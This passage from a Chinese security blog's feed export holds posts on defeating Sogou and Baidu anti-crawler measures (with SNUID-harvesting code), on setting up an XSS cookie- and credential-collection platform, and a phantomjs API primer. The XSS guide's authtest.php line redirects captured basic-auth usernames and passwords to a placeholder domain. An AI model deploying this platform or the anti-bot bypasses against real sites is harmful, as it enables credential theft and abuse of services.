none;"&gt;&lt;/span&gt; &lt;/p&gt; &lt;/form&gt; &lt;p class="p5"&gt; &lt;a href="javascript:void(0);" id="submit"&gt;提交&lt;/a&gt; &lt;span&gt;提交后没解决问题？欢迎&lt;a href="http://fankui.help.sogou.com/index.php/web/web/index?type=10&amp;anti_time=1477543279&amp;domain=www.sogou.com" target="_blank"&gt;反馈&lt;/a&gt;。&lt;/span&gt; &lt;/p&gt;&lt;/div&gt;&lt;div id="ft"&gt;&lt;a href="http://fuwu.sogou.com/" target="_blank"&gt;企业推广&lt;/a&gt;&lt;a href="http://corp.sogou.com/" target="_blank"&gt;关于搜狗&lt;/a&gt;&lt;a href="/docs/terms.htm?v=1" target="_blank"&gt;免责声明&lt;/a&gt;&lt;a href="http://fankui.help.sogou.com/index.php/web/web/index?type=10&amp;anti_time=1477543279&amp;domain=www.sogou.com" target="_blank"&gt;意见反馈&lt;/a&gt;&lt;br&gt;&amp;nbsp;&amp;copy;&amp;nbsp;2016&lt;span id="footer-year"&gt;&lt;/span&gt;&amp;nbsp;SOGOU&amp;nbsp;-&amp;nbsp;&lt;a href="http://www.miibeian.gov.cn" target="_blank" class="g"&gt;京ICP证050897号&lt;/a&gt;&amp;nbsp;-&amp;nbsp;京公网安备1100&lt;span class="ba"&gt;00000025号&lt;/span&gt;&lt;/div&gt;&lt;script src="static/js/index.min.js?v=0.1.3"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--zly--&gt; 自动化生成SNUID虽然知道了SNUID值生成的过程，但只有实现了自动化生成，才能正真绕过反爬虫的限制。 通过访问验证码页面获取当访问验证码页面，并填写验证码完成验证后，会重新生成一个新的SNUID，而此请求可以重复发送（不需要再次输入验证码），每次发送都会生成一个新的SNUID。 通过模拟浏览器访问，执行javascript可以利用phantomjs去爬取sogou页面，也能获取SNUID值。 获取SNUID代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#! -*- coding:utf-8 -*-'''获取SNUID的值'''import requestsimport jsonimport timeimport random'''方法（一）通过phantomjs访问sogou搜索结果页面，获取SNUID的值'''def phantomjs_getsnuid(): from selenium import webdriver d=webdriver.PhantomJS('D:\python27\Scripts\phantomjs.exe',service_args=['--load-images=no','--disk-cache=yes']) try: d.get("https://www.sogou.com/web?query=") Snuid=d.get_cookies()[5]["value"] except: Snuid="" d.quit() return Snuid'''方法（二）通过访问特定url，获取body里面的id'''def Method_one(): url="http://www.sogou.com/antispider/detect.php?sn=E9DA81B7290B940A0000000058BFAB0&amp;wdqz22=12&amp;4c3kbr=12&amp;ymqk4p=37&amp;qhw71j=42&amp;mfo5i5=7&amp;3rqpqk=14&amp;6p4tvk=27&amp;eiac26=29&amp;iozwml=44&amp;urfya2=38&amp;1bkeul=41&amp;jugazb=31&amp;qihm0q=8&amp;lplrbr=10&amp;wo65sp=11&amp;2pev4x=23&amp;4eyk88=16&amp;q27tij=27&amp;65l75p=40&amp;fb3gwq=27&amp;azt9t4=45&amp;yeyqjo=47&amp;kpyzva=31&amp;haeihs=7&amp;lw0u7o=33&amp;tu49bk=42&amp;f9c5r5=12&amp;gooklm=11&amp;_=1488956271683" headers=&#123;"Cookie": "ABTEST=0|1488956269|v17;\ IPLOC=CN3301;\ SUID=E9DA81B7290B940A0000000058BFAB6D;\ PHPSESSID=rfrcqafv5v74hbgpt98ah20vf3;\ SUIR=1488956269" &#125; try: f=requests.get(url,headers=headers).content f=json.loads(f) Snuid=f["id"] except: Snuid="" return Snuid'''方法（三）访问特定url，获取header里面的内容'''def Method_two(): url="https://www.sogou.com/web?query=333&amp;_asf=www.sogou.com&amp;_ast=1488955851&amp;w=01019900&amp;p=40040100&amp;ie=utf8&amp;from=index-nologin" headers=&#123;"Cookie": "ABTEST=0|1488956269|v17;\ IPLOC=CN3301;\ SUID=E9DA81B7290B940A0000000058BFAB6D;\ PHPSESSID=rfrcqafv5v74hbgpt98ah20vf3;\ SUIR=1488956269" &#125; f=requests.head(url,headers=headers).headers print f'''方法（四）通过访问需要输入验证码解封的页面，可以获取SNUID'''def Method_three(): ''' http://www.sogou.com/antispider/util/seccode.php?tc=1488958062 验证码地址 ''' ''' http://www.sogou.com/antispider/?from=%2fweb%3Fquery%3d152512wqe%26ie%3dutf8%26_ast%3d1488957312%26_asf%3dnull%26w%3d01029901%26p%3d40040100%26dp%3d1%26cid%3d%26cid%3d%26sut%3d578%26sst0%3d1488957299160%26lkt%3d3%2C1488957298718%2C1488957298893 访问这个url，然后填写验证码，发送以后就是以下的包内容，可以获取SNUID。 ''' import socket import re res=r"id\"\: \"([^\"]*)\"" s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(('www.sogou.com',80)) s.send('''POST http://www.sogou.com/antispider/thank.php HTTP/1.1Host: www.sogou.comContent-Length: 223X-Requested-With: XMLHttpRequestContent-Type: application/x-www-form-urlencoded; charset=UTF-8Cookie: CXID=65B8AE6BEE1CE37D4C63855D92AF339C; SUV=006B71D7B781DAE95800816584135075; IPLOC=CN3301; pgv_pvi=3190912000; GOTO=Af12315; ABTEST=8|1488945458|v17; PHPSESSID=f78qomvob1fq1robqkduu7v7p3; SUIR=D0E3BB8E393F794B2B1B02733A162729; SNUID=B182D8EF595C126A7D67E4E359B12C38; sct=2; sst0=958; ld=AXrrGZllll2Ysfa1lllllVA@rLolllllHc4zfyllllYllllljllll5@@@@@@@@@@; browerV=3; osV=1; LSTMV=673%2C447; LCLKINT=6022; ad=6FwTnyllll2g@popQlSGTVA@7VCYx98tLueNukllll9llllljpJ62s@@@@@@@@@@; SUID=EADA81B7516C860A57B28911000DA424; successCount=1|Wed, 08 Mar 2017 07:51:18 GMT; seccodeErrorCount=1|Wed, 08 Mar 2017 07:51:45 GMTc=6exp2e&amp;r=%252Fweb%253Fquery%253Djs%2B%25E6%25A0%25BC%25E5%25BC%258F%25E5%258C%2596%2526ie%253Dutf8%2526_ast%253D1488957312%2526_asf%253Dnull%2526w%253D01029901%2526p%253D40040100%2526dp%253D1%2526cid%253D%2526cid%253D&amp;v=5 ''') buf=s.recv(1024) p=re.compile(res) L=p.findall(buf) if len(L)&gt;0: Snuid=L[0] else: Snuid="" return Snuiddef getsnuid(q): while 1: if q.qsize()&lt;10: Snuid=random.choice([Method_one(),Method_three(),phantomjs_getsnuid()]) if Snuid!="": q.put(Snuid) print Snuid time.sleep(0.5)if __name__=="__main__": import Queue q=Queue.Queue() getsnuid(q) cookie问题解决方案 SUID的值获取比较简单，直接访问sogou即可获取。 获取到SUID的值后，再去获取SNUID值（可通过以上几种方式） 获取到SNUID后，可保存到队列中。 说明：SNUID的值如果不去使用它，可以存放很久，直到使用它到上限才会作废；SUID一般不会做次数限制，可以一直使用。 ip问题解决方案 在爬取搜狗时，除了cookie问题以外，也需要解决ip问题，当然这个问题可以参考爬百度的解决方案，参考地址：爬搜索引擎之寻你千百度 申明：本文只是列举了我在爬取搜狗资源时遇到的问题，不代表搜狗本身所有的反爬虫技术，本文提供的解决方案具有时效性，具体还需自己动手实验，如有更好的解决方案可留言交流哦 本文地址：http://thief.one/2017/03/19/爬取搜索引擎之搜狗/转载请说明来自：nMask’Blog 传送门 爬取搜索引擎之搜狗爬取搜索引擎之寻你千百度]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>搜索引擎</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取搜索引擎之寻你千百度]]></title>
    <url>../../../../../../../../2017/03/17/爬搜索引擎之寻你千百度/</url>
    <content type="text"><![CDATA[与天斗，其乐无穷；与地斗，其乐无穷 自从Google退出中国市场，Baidu就成了国内搜索引擎巨头，所谓树大招风，一直以来百度成为国内众多黑客攻击的对象。又因为其本身作为一款搜索引擎，拥有很多的网络资源，因此借助baidu来获取海量数据，成为了一种便捷有效的信息收集途径。虽然baidu在爬虫算法上没有google那么优秀，但对中文搜索的支持并不会很差（小小吐槽一番百度），然而在通过百度爬取数据时，我们往往会遇到百度自身的反爬虫措施，如何解决这些反爬虫措施，将会是本文的重点。 关于反爬虫的技术，网上有很多资源，方法不外乎（代理、识别验证码、分布式架构、模拟浏览器、ADSL切换ip等），这些不是本文的重点，本文只针对爬取百度搜索引擎时遇到的反爬虫措施，以及一些解决方案。 为甚么要爬取百度 百度没有提供APi 百度拥有丰富的资源可供查询 百度反爬虫没有那么变态 百度反爬虫措施 一般来说，单线程的爬虫时间间隔设置为&gt;2s，短时间内应当不会被屏蔽，当然长时间爬取还是不行；如果使多线程无时间间隔爬取，那么大概30分钟肯定就会屏蔽了。 我曾尝试过添加headers，甚至使用phantomjs模拟浏览器等方式，均以失败告终。我想百度作为一家搜索引擎公司，爬虫技术本就是其核心技术之一，因此跟它玩反爬虫技术应当是以卵击石（类似模拟浏览器，修改headers等方法应该无效）。 然而我们可以换个思路，百度也不是不允许爬虫访问，只是限制了爬取频率。而对于访问的headers等信息并没有做明显的限制。那么也就是说，百度的反爬虫实际上是控制单ip访问的频率，那么我们就可以通过分布式架构或者切换ip等方式去解决。 被屏蔽现象 在探讨如何解决被屏蔽问题前，我们先来研究下被百度屏蔽时的现象。一般来说，当百度检测到某ip访问流量特别大时，会先进行源码提示，如果还没停止访问，那么就会直接屏蔽访问。 源码提示网络异常网页源码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=gb2312" /&gt;&lt;title&gt;百度--您的访问出错了&lt;/title&gt;&lt;style&gt;body&#123;text-align:center;margin-top:3px&#125;#wrap&#123;width:650px;text-align:left;margin:auto&#125;#logo&#123;float:left;margin:0 3px 0 0&#125;#logo img&#123;border:0&#125;#title&#123;float:left;width:510px&#125;#intitle&#123;margin:20px 0 0 0;background-color:#e5ecf9;width:100%;font-weight:bold;font-size:14px;padding:3px 0 4px 10px&#125;#content&#123;clear:left;padding-top:60px;line-height:200%&#125;#vf&#123;margin-top:10px&#125;#vf img&#123;float:left;border:1px solid #000&#125;#kw&#123;font:16px Verdana;height:1.78em;padding-top:2px&#125;#vf form&#123;float:left;margin:12px 0 0 5px;padding:0&#125;#ft&#123;text-align:center&#125;#ft,#ft a&#123;color:#666;font-size:14px&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="wrap"&gt;&lt;div id="logo"&gt;&lt;a href="http://www.baidu.com"&gt;&lt;img alt="到百度首页" title="到百度首页" src="http://www.baidu.com/img/logo-yy.gif" width="137" height="46"&gt;&lt;/a&gt;&lt;/div&gt;&lt;div id="title"&gt;&lt;div id="intitle"&gt;您的访问出错了&lt;/div&gt;&lt;/div&gt;&lt;div id="content"&gt;很抱歉，您的电脑或所在的“”“”的访问，此刻我们无法响应您的请求。 &lt;br&gt;请输入以下验证码，即可恢复使用。&lt;/div&gt;&lt;div id="vf"&gt;&lt;img src="http://verify.baidu.com/cgi-bin/genimg?6D8B74BFF43F7AE5457E1E8DA8C63355C8F00514C99AC6AD0182FCD695A4FED003A2592509E05792FF7A137E4184B4D9D9F5366F" width="120" height="40"&gt;&lt;form action="http://verify.baidu.com/verify"&gt;&lt;input type="hidden" name="url" value="http://www.baidu.com/s?wd=.gov.cn&amp;pn=0&amp;vif=1"&gt;&lt;input type="hidden" name="vcode" value="6D8B74BFF43F7AE5457E1E8DA8C63355C8F00514C99AC6AD0182FCD695A4FED003A2592509E05792FF7A137E4184B4D9D9F5366F"&gt;&lt;input type="hidden" name="id" value="1488861310"&gt;&lt;input type="hidden" name="di" value="ad617386491a359a"&gt;&lt;input type="text" size="6" maxlength="10" name="verifycode" id="kw"&gt;&lt;input type="submit" value="提交"&gt;&lt;/form&gt;&lt;/div&gt;&lt;div style="clear:left;height:90px"&gt;&lt;/div&gt;&lt;div id="ft"&gt;&amp;copy;2014 Baidu &lt;a href="http://www.baidu.com/duty/index.html"&gt;免责声明&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;(function()&#123; var rfr = window.document.location.href, p = encodeURIComponent(rfr), img = new Image(), imgzd = new Image(), re = /\/vcode\?http:\/\/(\S+)\.baidu/ig,r=""; img.src = "http://nsclick.baidu.com/v.gif?pid=201&amp;pj=vcode&amp;path="+p+"&amp;t="+new Date().getTime(); r = re.exec(rfr); if(r&amp;&amp;r[1])&#123;imgzd.src = "http://"+r[1]+".baidu.com/v.gif?fr=vcode&amp;url="+p+"&amp;t="+new Date().getTime();&#125;&#125;)();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 直接屏蔽Ip地址此种情况访问会报错。 常规解决方案 基于百度反爬虫的特点，我们可以通过分布式部署爬虫服务器，来采集资源，当然个人觉得ADSL服务器效果会更佳。但是分布式部署，尤其是ADSL服务器部署，成本会变得非常高，而且需要维护。那么有没有只用一台服务器就可以解决被屏蔽的问题呢？ 答案是肯定，那就是单机+多线程+ip代理，这种方式比较实惠，但比较考验ip代理的稳定性。经个人测试，感觉国内绝大部分代理（收费、免费、动态等）都不是很稳定，因此这是一种折中的方式，那么有没有更好的方式呢？ 另类解决方案 作为一家搜索引擎公司，百度的爬虫一定是分布式部署；又因为百度在国内的占有率很高，因此其提供搜索服务的服务器也应当是分布式部署的，也就是说全国各地部署了很多百度的服务器。 那么当我们打开浏览器，访问百度时，提供搜索服务的服务器往往是离我们最近的那台，因此可以想见屏蔽我们的也就是那台服务器。大胆想象一下，如果我们能自由切换去访问不同地区的百度服务器，那么是否可以绕过被单一服务器屏蔽的问题呢？ 当然这一解决方案的前提是： 我们必须拥有大量的百度服务器的ip地址 百度允许用ip地址访问（实在不行就更改host） 可喜的是，以上2点都不难办到。网上有百度服务器的资源可以获取，当然也可以通过在不同地区的服务器ping百度获取ip；至于直接通过ip地址访问百度，这默认便是可行的（不知道百度为何这样设置） 百度的大招c通过以上几种方式，应该可以绕过百度的反爬虫机制，但是百度也不是吃素的，它也有自己独特的反爬虫杀招，或许称之为”搜索限制”或者是”资源保护”措施更合适一点。 搜索结果数设上限通过百度搜索引擎搜索关键词，计算出来的结果数设有上限。此数量最高显示上限是1亿，其实远远不止，因此数据是不真实的。 搜索页面数设上限再看搜索的结果页面数：最多只显示76页，而这只是所有结果中的冰山一角。 cookies影响搜索结果在几次爬取过程中，我无意发现在headers中加不加cookies会影响最终的搜索结果（主要影响搜索结果的多少）。 以上几点严格意义上来说，并不算反爬虫技术，只是一种保护自身资源的方式，其意不言而喻 Baidu_link问题 通过获取百度搜索结果源码，以及通过正则匹配，我们能够得到一些搜索结果链接，然后这些链接并不是网站原链接，有以下2种形式：123http://www.baidu.com/link?url=1qIAIIh_2N7LUQpI0AARembLK2en4QpGjaRqKZ3BxYtzoZYevC5jA2jq6XMwgEKF&amp;wd=&amp;eqid=9581fbec0007eae00000000458200ad4http://www.baidu.com/link?url=1qIAIIh_2N7LUQpI0AARembLK2en4QpGjaRqKZ3BxYtzoZYevC5jA2jq6XMwgEKF 我暂且称它为”百度链接”，其基本就是以上2种形式。第一种是通过点击右键复制链接地址获取到的，通常带有eqid参数，用来表示referer；第二种是通过页面源代码获取到的，这种是不带wd与eqid参数的。而eqid参数的值在每次刷新页面后，都会改变，这可能是百度限制黑帽SEO所设置的一个参数。 那么我们比较两者之差异，当我们分别取访问这2条连接时，返回的数据包是不一样的。 带eqid参数第一种带eqid参数的会返回200，在body里面会有网站真实的链接，可以通过正则匹配：1res_baidu=r"window\.location\.replace\(\"([^\"]*)\"\)" 不带eqid参数第二种不带参数的会返回一个302跳转，并且在header会有location字段，可以通过requests模块（head模式）去访问获取。 解析baidu_link模块1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#! -*- coding:utf-8 -*-'''@解析baidu_link'''__author__="nMask"__Blog__="http://thief.one"__Date__="20170301"import requestsimport reres_baidu=r"window\.location\.replace\(\"([^\"]*)\"\)"class anbaidulink: headers=&#123;'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6', 'Referer':'http://www.baidu.com/link?url='&#125; def __init__(self): pass def run(self,url,one_proxy=""): ''' 入口函数，接受baidu_link以及代理地址，默认为""，代理地址要是http://xx.xx.xx.xx:xx格式 ''' if "&amp;eqid=" in url: url=self.have_eqid(url,one_proxy) else: url=self.noeqid(url,one_proxy) return url def noeqid(self,url,one_proxy): ''' 针对baidu_link中没有eqid参数 ''' try: h=requests.head(url,proxies=&#123;'http':one_proxy&#125;,headers=anbaidulink.headers,timeout=5).headers # except Exception,e: print e else: url=h["location"] return url def have_eqid(self,url,one_proxy): ''' 针对baidu_link中存在eqid参数 ''' try: body=requests.get(url,proxies=&#123;'http':one_proxy&#125;,headers=anbaidulink.headers,timeout=5).content # except Exception,e: print e else: p=re.compile(res_baidu) url=p.findall(body) if len(url)&gt;0: url=url[0] return urlif __name__=="__main__": cur=anbaidulink() url=cur.run(url='https://www.baidu.com/link?url=1qIAIIh_2N7LUQpI0AARembLK2en4QpGjaRqKZ3BxYtzoZYevC5jA2jq6XMwgEKF&amp;wd=&amp;eqid=9581fbec0007eae00000000458200ad4',one_proxy="") #url=cur.run(url='http://www.baidu.com/link?url=1qIAIIh_2N7LUQpI0AARembLK2en4QpGjaRqKZ3BxYtzoZYevC5jA2jq6XMwgEKF',one_proxy="") print url 申明：本文只是列举了我在爬取百度资源时遇到的问题，不代表百度本身所有的反爬虫技术，本文提供的解决方案具有时效性，具体还需自己动手实验，如有更好的解决方案可留言交流哦 本文地址：http://thief.one/2017/03/17/爬搜索引擎之寻你千百度/转载请说明来自：nMask’Blog 传送门 爬取搜索引擎之搜狗爬取搜索引擎之寻你千百度]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>搜索引擎</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Xss平台搭建小记]]></title>
    <url>../../../../../../../../2017/03/15/Xss平台搭建小记/</url>
    <content type="text"><![CDATA[每天把牢骚拿出来晒晒太阳，心情就不会缺钙 之前搭建过很多次xss平台，也用过几套源代码，然而对比之下，还是觉得wuyun的xss.me源码比较好用，即使比较古老了。最近因为工作需要，又准备重新搭建一套xss平台，源码果断选择了xss.me（当然是经过修改之后的），我的源码来之博客:http://www.bodkin.ren/?p=133，感谢其分享。 Xss平台的搭建过程并不复杂，虽然期间遇到了一些小问题，但也很快解决了，在此记录分享。 xss源码下载 修改版 原版 Install 首先下载xssplatform源码，然后选择一台服务器安装wamp，这里之所以选择wamp来搭建环境，主要是想免去配置apache、mysql的麻烦，因为本文重点还是在于搭建xss平台的过程。（大神可以选择在linux上单独安装配置apache） 服务器环境配置好以后，将xss源码放在wamp的www目录下，启动wamp，此时如果wamp运行正常，我们打开localhost/xss/应该可以看到登陆界面了，但此时还不能进行登陆或者注册，还需要进行多项配置。 apache配置 打开wamp\bin\apache\apache2.4.9\conf\httpd.conf，为了后面搭建xss平台不出现错误，我们先将网站目录设置一下：1将其中的c:/wamp/www/ 改为c:/wamp/www/xss/，重启apache。 这时打开localhost就可以看到登陆页面了，而不需要访问localhost/xss/路径。当然如果有特殊需要，必须设置二级目录的，那之后的一些路径配置，请都设置成二级目录，即在原来的路径前面加上目录名称，如/xss/index.php等。 数据库配置 打开localhost/phpmyadmin进入phpmyadmin管理界面，添加一个用户root,123456,为了安全起见，删除其他用户。然后添加一个数据库，名为poppy（具体数据库名称可查看xss.sql文件，里面有写），然后导入xss.sql文件即可。 更改oc_module模块域名，进入oc_module表，执行sql语句，改为自己的域名。（影响生成的xss poc）1UPDATE oc_module SET code=REPLACE(code,&quot;http://xsser.me&quot;,&quot;http://xxx.com&quot;); Xss源码配置apache与数据库配置完以后，还需要配置xss源码。 config.php打开根目录下的config.php文件，主要看以下这些配置。123456789101112131415/* 数据库连接 */$config['dbHost'] ='localhost'; //数据库地址$config['dbUser'] ='root'; //用户$config['dbPwd'] ='123456'; //密码$config['database'] ='poppy'; //数据库名$config['charset'] ='utf8'; //数据库字符集$config['tbPrefix'] ='oc_'; //表名前缀$config['dbType'] ='mysql'; //数据库类型(目前只支持mysql)/* 注册配置 */$config['register'] ='invite'; //normal,正常;invite,只允许邀请注册;close,关闭注册功能$config['mailauth'] =false; //注册时是否邮箱验证/* url配置 */$config['urlroot'] ='http://localhost';//访问的url起始 修改配置如下： $config[‘database’] =’poppy’; #更改，保持跟数据名一致（数据库名字查看.sql文件） 数据库账号密码可以选择更改，也可以保持不变。 $config[‘register’] =’normal’; # 改为不需要邀请码。 $config[‘urlroot’] =’http://localhost‘; #改为本地 修改authtest.php修改根目录下authtest.php文件，改成自己的域名或者ip。123456 else if ((isset($_SERVER['PHP_AUTH_USER'])) &amp;&amp; (isset($_SERVER['PHP_AUTH_PW'])))&#123; /* 变量值存在，检查其是否正确 */ header("Location: http://xxx.com/index.php?do=api&amp;id=&#123;$_GET[id]&#125;&amp;username=&#123;$_SERVER[PHP_AUTH_USER]&#125;&amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;"); &#125; 修改完配置以后，打开localhost，注册一个账号。注册完成后oc_user表中会新增一个记录，手动将adminlevel改为1（即管理员权限，可以有权限下放邀请码）。 完成以上步骤，平台差不多就可以用了，但如果遇到了一些其他问题，请继续往下看。 Xss_Url 404问题出现的问题：当访问1http://xxx.com/y42f59?1489555427 等自动生成的xss_poc时，会出现404错误，这是由于url重写没有生效的缘故，主要是因为中间件配置问题。以下就apache与iis中间件，给出解决方案。 apache解决方案首先在网站根目录添加.htaccess文件，文件内容如下：12345678&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteBase /RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L]RewriteRule ^do/auth/(\w+?)(/domain/([\w\.]+?))?$ /index.php?do=do&amp;auth=$1&amp;domain=$3 [L]RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L]RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]&lt;/IfModule&gt; 注意：如果网站需要域名+目录去访问的，如：www.xxx.com/xss/，则在以下代码/index.php前添加/xss/index.php。 然后修改apache配置文件，允许url重写。1AllowOverride None 全部改为1AllowOverride All 这样，apache会根据根目录下的.htaccess文件去匹配url重写规则。 做完以上2条配置后访问类似于此地址，就会显示xss_poc（js）内容了。1http://xxx.com/y42f59?1489555427 写文本时，我是在windows下做的测试，linux下配置方法应当一致。 iis解决方案参考：http://www.bodkin.ren/?p=133 邮件短信设置 修改文件\source\function.php 257行,把里面的邮箱账号密码换一下，host改为smtp.xx.com，如：smtp.qq.com 飞信短信提醒功能，修改\source\api.php 72行手机号，可能只支持移动手机号。 老版本其他问题新的源码不需要修改以下参数，老版本可能需要修改 修改注册页面提交按钮修改themes\default\templates\register.html内容：1&lt;input id="btnRegister" type="button" onclick="Register()" value="提交注册" /&gt; 修改为1&lt;input id="btnRegister" type="submit" value="提交注册" /&gt; 邀请码生成（1）将文件source\user.php第10行和50行的权限控制注释掉12//if($user-&gt;userId&lt;=0) ShowError('未登录或已超时',$url['login'],'重新登录');//if($user-&gt;adminLevel&lt;=0) ShowError('没有操作权限',URL_ROOT.'/index.php?do=user&amp;act=invite'); 然后访问/index.php?do=user&amp;act=invite即可生成验证码（2）注册一个用户test，进入数据库，将该用户的adminLevel修改为1，然后去掉（1）中添加到注释；并在第15行case ‘invite’:处添加权限控制：1if($user-&gt;adminLevel&lt;=0) ShowError('没有操作权限',URL_ROOT.'/index.php'); （3）或者开放普通注册权限，修改文件/config.php的第18行1$config['register']='invite'; //normal,正常;invite,只允许邀请注册;close,关闭注册功能 删除cookie 修改文件themes\default\templates\project_view.html中的Delete()和MultiDelete()函数，将其中post的URL修改为1'/xss/index.php?do=project&amp;act=delcontent&amp;r=' 即根据实际的服务器路径，在前面添加’/xss’。 source\class\user.class.php123$this-&gt;db-&gt;Execute("UPDATE ".$this-&gt;tbUser." SET loginTime='".time()."'");修改为$this-&gt;db-&gt;Execute("UPDATE ".$this-&gt;tbUser." SET loginTime='".time()."' where id=&#123;$row['id']&#125;"); 修改跳转提示时间文件themes/default/templates/notice.html：123setTimeout("location.href='&#123;$notice.turnto&#125;'",3000);修改为setTimeout("location.href='&#123;$notice.turnto&#125;'",500);]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>xss平台</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【phantomjs系列】Phantomjs Api介绍]]></title>
    <url>../../../../../../../../2017/03/13/Phantomjs-Api介绍/</url>
    <content type="text"><![CDATA[晋书云：“生犀不敢烧，燃之有异香，沾衣带，人能与鬼通” 之前几篇文章介绍了Selenium+Phantomjs用法，也探讨过性能优化问题。然而利用selenium或者说python去运行phantomjs本质上并不是高效的方法，再者selenium对于phantomjs的封装并不是特别完善（长久没有更新过），因此很有必要研究下原生态的phantomjs。于是我参考官网介绍，学习总结成文，在此记录分享。 phantomjs全面支持web而不需要浏览器，又称为无头浏览器，它是一个基于webkit的服务端javascript API，可以用于页面自动化，网络监测，网页截图，爬虫抓取等。phantomjs有很多api接口，接口语法用的就是js的语法，phantom提供了类，实例化以后可以调用对象的方法，通过回调函数可以实现自己想要的功能，其APi主要有web服务端Api、webPage APi、System APi等，这里主要介绍几种常用的api的用法。 phantomjs-Command Line Interface描述：phantomjs命令行用法以及参数设置首先我们看下如何调用phantomjs运行js脚本1phantomjs [options] somescript.js [arg1 [arg2 [...]]] 可选参数：（只列举常用的） –disk-cache=[true|false] 缓存设置 –ignore-ssl-errors=[true|false] 忽略ssl错误 –load-images=[true|false] 加载图片 –proxy=address:port 设置代理 有很多参数，不一一列举，详细参考：phantomjs-Command Line Interface phantomjs-system module描述：phantomjs系统操作APi文档地址：phantomjs-system module作用：用于system系统操作 args（获取程序输入参数）代码（test.js）12345678910var system = require('system');var args = system.args;if (args.length === 1) &#123; console.log('Try to pass some arguments when invoking this script!');&#125; else &#123; args.forEach(function(arg, i) &#123; console.log(i + ': ' + arg); &#125;);&#125; 运行：phantomjs test.js hello结果：0 test.js1 hello功能：接受控制台输入参数。 env（系统环境变量）代码（test.js）:123456var system = require('system');var env = system.env;Object.keys(env).forEach(function(key) &#123; console.log(key + '=' + env[key]);&#125;); 运行：phantomjs test.js功能：列出系统环境变量 os（平台类型）代码（test.js）：12345var system = require('system');var os = system.os;console.log(os.architecture); // '32bit'console.log(os.name); // 'windows'console.log(os.version); // '7' 运行：phantomjs test.js结果：32bitwindows7功能：输出运行平台类型 pid （进程id）代码（test.js）:1234var system = require('system');var pid = system.pid;console.log(pid); 输出进程pid platgform（平台信息）代码（test.js）:12var system = require('system');console.log(system.platform); // 'phantomjs' 运行结果:phantomjs Phantomjs-web server module描述：phantomjs web server module APi文档地址：Phantomjs-web server module作用：作为webserver服务端，提供http服务。代码（test.js）：123456789101112131415var webserver = require('webserver');var server = webserver.create();var service = server.listen(8080, function(request, response) &#123; response.statusCode = 200; response.setHeader("Cookie","1adaa2121"); response.setEncoding("binary"); response.write('&lt;html&gt;&lt;body&gt;Hello!&lt;/body&gt;&lt;/html&gt;'); console.log(request.method); console.log(request.url); console.log(request.httpVersion); console.log(request.headers); console.log(request.post); console.log(request.postRaw); response.close();&#125;); 运行：phantomjs test.js访问：http://localhost:8080 如果要指定ip与端口，则8080可以这样写：’127.0.0.1:9999’。 其中有2个参数，request与response。 request参数方法： request.method request.url request.httpVersion request.headers request.post request.postRaw 用来获取请求内容。 response参数方法： response.headers response.setheader(name,value) response.header(name) response.statusCode() response.setEncoding(“binary”) response.write(html_data) response.writeHead(statusCode,headers) reponse.close() reponse.closeGracefully() Phantomjs-web page module描述：phantomjs web page module APi文档地址：Phantomjs-web page module作用：用来发送http请求，获取网络资源，或者页面操作。 实例化api类12var webPage = require('webpage');var page = webPage.create(); page方法 page.content 源码 page.title 标题 page.cookie cookie page.plainText 网页内容（去除html） page.setting 参数设置 page.url 当前url clipRect剪切页面123456page.clipRect = &#123; top: 14, left: 3, width: 400, height: 300&#125;; content获取网页源码12345678var webPage = require('webpage');var page = webPage.create();page.open('http://thief.one', function (status) &#123; var content = page.content; console.log('Content: ' + content); phantom.exit();&#125;); cookie获取页面cookie12345678910page.open('http://thief.one', function (status) &#123; var cookies = page.cookies; console.log('Listing cookies:'); for(var i in cookies) &#123; console.log(cookies[i].name + '=' + cookies[i].value); &#125; phantom.exit();&#125;); 设置customHeaders内容：1234page.customHeaders = &#123; "X-Test": "foo", "DNT": "1"&#125;; plainText获取网页内容（去除html只留内容）1234page.open('http://thief.one', function (status) &#123; console.log('Stripped down page text:\n' + page.plainText); phantom.exit();&#125;); setting 请求头设置123var webPage = require('webpage');var page = webPage.create();page.settings.userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'; zoomFactor缩略图创建12345var webPage = require('webpage');var page = webPage.create();page.zoomFactor = 0.25;page.render('capture.png'); addcookie添加cookie123456789phantom.addCookie(&#123; 'name' : 'Valid-Cookie-Name', /* required property */ 'value' : 'Valid-Cookie-Value', /* required property */ 'domain' : 'localhost', 'path' : '/foo', /* required property */ 'httponly' : true, 'secure' : false, 'expires' : (new Date()).getTime() + (1000 * 60 * 60) /* &lt;-- expires in 1 hour */&#125;); 上传文件1234var webPage = require('webpage');var page = webPage.create();page.uploadFile('input[name=image]', '/path/to/some/photo.jpg'); render页面截图12345page.viewportSize = &#123; width: 1920, height: 1080 &#125;;page.open("http://www.google.com", function start(status) &#123; page.render('google_home.jpeg', &#123;format: 'jpeg', quality: '100'&#125;); phantom.exit();&#125;); 